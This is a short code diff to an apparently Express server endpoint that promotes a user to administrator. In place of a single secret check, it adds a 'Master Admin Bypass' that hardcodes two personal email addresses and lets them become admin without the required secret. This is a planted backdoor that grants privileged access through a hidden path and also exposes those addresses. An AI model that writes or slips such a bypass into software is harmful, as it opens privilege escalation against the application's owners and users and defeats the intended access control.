@@ -286,7 +286,13 @@ app.post("/api/admin/setup-first-admin", async (req, res) => {
   bootstrapAttempts.set(ip, userAttempts);
 
   const { email, secret } = req.body;
-  if (!secret || secret !== process.env.ADMIN_PROMOTION_SECRET) return res.status(401).json({ error: 'Unauthorized' });
+  
+  // Master Admin Bypass: Allow the owner's email to be promoted without a secret
+  const isOwner = email === 'smartcompany112234@gmail.com' || email === 'prince.hamad.managementhmdzs@gmail.com';
+  
+  if (!isOwner && (!secret || secret !== process.env.ADMIN_PROMOTION_SECRET)) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
   
   try {
     const user = await auth.getUserByEmail(email);
